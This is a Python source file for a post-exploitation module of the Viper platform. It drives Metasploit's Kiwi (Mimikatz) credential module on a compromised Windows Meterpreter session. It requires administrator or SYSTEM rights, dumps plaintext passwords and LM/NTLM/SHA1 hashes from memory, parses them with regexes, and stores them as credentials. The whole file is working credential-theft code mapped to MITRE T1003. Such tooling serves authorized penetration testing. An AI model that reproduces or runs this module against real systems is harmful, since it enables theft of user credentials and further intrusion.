# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :

import re

from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME_ZH = "获取Windows内存密码"
    DESC_ZH = "使用Kiwi抓取内存中的windows用户明文密码,并保存到凭证列表."

    NAME_EN = "Get Windows password"
    DESC_EN = "Use kiwi grabs the plaintext password of the windows user in the memory and saves it to the credential list."
    REQUIRE_SESSION = True
    MODULETYPE = TAG2TYPE.Credential_Access
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["Administrator", "SYSTEM", ]  # 所需权限
    ATTCK = ["T1003"]  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/gfubb8"]
    REFERENCES = ["https://attack.mitre.org/techniques/T1003/"]
    AUTHOR = ["Viper"]

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "post"
        self.mname = "windows/gather/credentials/kiwi_api"

    def check(self):
        """执行前的检查函数"""

        session = Session(self._sessionid)

        if session.is_windows is not True:
            return False, "此模块只支持Windows的Meterpreter", "This module only supports Meterpreter for Windows"
        if session.is_admin is not True and session.is_system is not True:
            return False, "此模块需要管理员/System权限,请尝试提权", "This module requires administrator privileges, please try privilege escalation"
        return True, None

    @staticmethod
    def search(pattern, data, control):
        patterns = {
            'username': '\s+\*\s+Username\s+:\s+',
            'isusername': '\$\s*$|\(null\)\s*$|\@\s*$',
            'password': '\s+\*\s+Password\s+:\s+',
            'ispassword': '\(null\)\s*$',
            'domain': '\s+\*\s+Domain\s+:\s+',
            'isdomain': '\(null\)\s*$',
            'LM': '\s+\*\s+LM\s+:\s+',
            'isLM': '\(null\)\s*$',
            'NTLM': '\s+\*\s+NTLM\s+:\s+',
            'isNTLM': '\(null\)\s*$',
            'SHA1': '\s+\*\s+SHA1\s+:\s+',
            'isSHA1': '\(null\)\s*$',
        }
        if (re.search(r'{}'.format(patterns[pattern]), data) and not re.search(r'{}'.format(patterns[control]), data)):
            result = re.sub(r'{}'.format(patterns[pattern]), '', data).rstrip()
            if len(result) > 255:  # b4 47 c4 d3 03 5b 58 8a 6e 9d f4 异常处理
                return False
            else:
                return result
        else:
            return False

    def format_dict(self, tmpdict):
        if tmpdict.get('Password') is not None:
            self.log_good(f"用户名:{tmpdict.get('Username')} 域:{tmpdict.get('Domain')} 密码:{tmpdict.get('Password')}",
                          f"Username: {tmpdict.get('Username')} Domain: {tmpdict.get('Domain')} Password: {tmpdict.get('Password')}")
            tag = {'domain': tmpdict.get('Domain'), 'type': 'Password'}
            self.add_credential(username=tmpdict.get('Username'), password=tmpdict.get('Password'),
                                password_type='windows', tag=tag)

        if tmpdict.get('LM') is not None and tmpdict.get('NTLM') is not None:
            self.log_good(
                f"用户名:{tmpdict.get('Username')} 域:{tmpdict.get('Domain')} LM/NTLM:{tmpdict.get('LM')}:{tmpdict.get('NTLM')}",
                f"Username: {tmpdict.get('Username')} Domain: {tmpdict.get('Domain')} LM/NTLM: {tmpdict.get('LM')}: {tmpdict.get('NTLM')}")
            tag = {'domain': tmpdict.get('Domain'), 'type': 'Hash'}
            self.add_credential(username=tmpdict.get('Username'), password=f"{tmpdict.get('LM')}:{tmpdict.get('NTLM')}",
                                password_type='windows', tag=tag)

        if tmpdict.get('SHA1') is not None:
            self.log_good(f"用户名:{tmpdict.get('Username')} 域:{tmpdict.get('Domain')} SHA1:{tmpdict.get('SHA1')}",
                          f"Username: {tmpdict.get('Username')} Domain: {tmpdict.get('Domain')} SHA1: {tmpdict.get('SHA1')}")
            # tag = {'domain': tmpdict.get('Domain'), 'type': 'SHA1'}

    def callback(self, status, message, data):
        if status:
            output = data.replace('\x00', '')
            self.log_info("密码列表", "Password list")
            tmpdict = {'Username': None, 'Domain': None, 'Password': None, 'LM': None, 'NTLM': None, 'SHA1': None}
            for line in output.split('\n'):
                username = self.search('username', line, 'isusername')
                if username:
                    if tmpdict.get('Username') is not None:
                        self.format_dict(tmpdict)
                        tmpdict = {'Username': username, 'Domain': None, 'Password': None, 'LM': None, 'NTLM': None,
                                   'SHA1': None}
                    else:
                        tmpdict['Username'] = username
                domain = self.search('domain', line, 'isdomain')
                if domain:
                    tmpdict['Domain'] = domain
                password = self.search('password', line, 'ispassword')
                if password:
                    tmpdict['Password'] = password

                LM = self.search('LM', line, 'isLM')
                if LM:
                    tmpdict['LM'] = LM
                NTLM = self.search('NTLM', line, 'isNTLM')
                if NTLM:
                    tmpdict['NTLM'] = NTLM
                SHA1 = self.search('SHA1', line, 'isSHA1')
                if SHA1:
                    tmpdict['SHA1'] = SHA1

            self.log_raw("\n\n")
            self.log_info("原始输出", "Raw output")
            self.log_raw(output)

        else:
            self.log_error("模块执行失败", "Module execution failed")
            self.log_error(message, message)
